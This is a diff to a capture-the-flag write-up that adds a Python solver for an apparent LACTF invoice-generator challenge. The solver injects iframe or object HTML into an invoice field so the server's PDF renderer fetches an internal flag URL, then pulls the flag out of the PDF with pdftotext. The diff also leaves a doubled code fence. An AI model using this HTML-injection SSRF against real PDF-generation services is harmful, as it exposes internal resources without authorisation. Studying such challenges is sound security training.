@@ -81,5 +81,88 @@ lactf{...}
 
 ## solve.py
 ```bash
-python3 solve.py --base "<INSTANCE URL>" --extract
+```python
+#!/usr/bin/env python3
+import argparse
+import re
+import subprocess
+import sys
+from urllib.parse import urljoin
+
+import requests
+
+IFRAME = '<iframe src="http://flag:8081/flag" style="width:900px;height:300px;border:3px solid black"></iframe>'
+OBJECT = '<object data="http://flag:8081/flag" type="text/html" style="width:900px;height:400px;border:3px solid black"></object>'
+
+FLAG_RE = re.compile(r"lactf\{[^}]+\}")
+
+def generate_pdf(base: str, payload: str, out_path: str) -> None:
+    """
+    POST /generate-invoice with injected HTML, save response as PDF.
+    Assumes server returns PDF content directly.
+    """
+    base = base.rstrip("/") + "/"
+    url = urljoin(base, "generate-invoice")
+
+    data = {
+        "name": "test",
+        "item": payload,
+        "cost": "1",
+        "datePurchased": "2026-01-01",
+    }
+
+    r = requests.post(url, json=data, timeout=30)
+    r.raise_for_status()
+
+    # best-effort: verify content-type contains pdf
+    ctype = r.headers.get("Content-Type", "")
+    if "pdf" not in ctype.lower():
+        # still write output, but warn
+        print(f"[!] Warning: Content-Type looks non-PDF: {ctype}", file=sys.stderr)
+
+    with open(out_path, "wb") as f:
+        f.write(r.content)
+
+    print(f"[+] Saved: {out_path} ({len(r.content)} bytes)")
+
+def extract_flag_from_pdf(pdf_path: str) -> str | None:
+    """
+    Extract text via pdftotext and grep flag pattern.
+    Requires poppler-utils installed.
+    """
+    try:
+        out = subprocess.check_output(["pdftotext", pdf_path, "-"], stderr=subprocess.STDOUT)
+    except FileNotFoundError:
+        print("[!] pdftotext not found. Install: sudo apt-get install -y poppler-utils", file=sys.stderr)
+        return None
+    except subprocess.CalledProcessError as e:
+        print("[!] pdftotext failed:", e.output.decode(errors="ignore"), file=sys.stderr)
+        return None
+
+    text = out.decode(errors="ignore")
+    m = FLAG_RE.search(text)
+    return m.group(0) if m else None
+
+def main():
+    ap = argparse.ArgumentParser(description="LACTF invoice-generator solver")
+    ap.add_argument("--base", required=True, help="Base URL, e.g. https://<INSTANCE>")
+    ap.add_argument("--out", default="invoice.pdf", help="Output PDF path")
+    ap.add_argument("--payload", choices=["iframe", "object"], default="iframe", help="HTML embedding method")
+    ap.add_argument("--extract", action="store_true", help="Extract flag from PDF after download")
+    args = ap.parse_args()
+
+    payload = IFRAME if args.payload == "iframe" else OBJECT
+
+    generate_pdf(args.base, payload, args.out)
+
+    if args.extract:
+        flag = extract_flag_from_pdf(args.out)
+        if flag:
+            print(f"[+] Flag: {flag}")
+        else:
+            print("[!] Flag not found in extracted text.", file=sys.stderr)
+            sys.exit(2)
+
+if __name__ == "__main__":
+    main()
 ```
